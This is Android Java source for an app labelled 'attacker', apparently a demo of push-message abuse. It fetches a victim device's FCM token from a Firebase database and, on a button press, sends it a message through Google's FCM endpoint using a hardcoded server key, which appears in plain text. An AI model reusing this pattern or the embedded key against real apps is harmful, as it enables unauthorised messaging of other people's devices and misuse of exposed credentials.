package com.kweisa.attacker;

import android.os.Bundle;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

public class MainActivity extends AppCompatActivity {
    String TAG = "MainActivity";
    String refreshedToken = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("refreshedToken");


        myRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String value = dataSnapshot.getValue(String.class);
                Log.d(TAG, "Value is: " + value);
                refreshedToken = value;
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        Button button = findViewById(R.id.button);
        assert button != null;
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            JSONObject jsonObject = new JSONObject();
                            jsonObject.accumulate("to", refreshedToken);
                            String json = jsonObject.toString();
                            HttpClient httpclient = new DefaultHttpClient();
                            HttpPost httpPost = new HttpPost("https://fcm.googleapis.com/fcm/send");
                            StringEntity se = new StringEntity(json);
                            httpPost.setEntity(se);
                            httpPost.setHeader("Content-type", "application/json");
                            httpPost.setHeader("Authorization", "key=AIzaSyBBZ-YiLDIk6KET-C0GFB0MV3P-DQxOChI");


                            httpclient.execute(httpPost);
                        } catch (IOException | JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
        });
    }
}
